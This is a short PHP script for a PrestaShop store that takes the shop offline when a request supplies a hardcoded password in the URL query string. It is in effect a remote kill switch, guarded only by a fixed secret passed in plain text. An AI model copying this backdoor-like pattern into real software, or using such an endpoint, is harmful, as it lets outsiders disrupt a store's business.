<?php

include('../config/config.inc.php');

if ($_GET['password'] == '02OWZYIE0I7TA896B9HP67EI')
   Db::getInstance()->execute("UPDATE `"._DB_PREFIX_."configuration` SET `value` = 0 WHERE `name` = 'PS_SHOP_ENABLE'");

?>
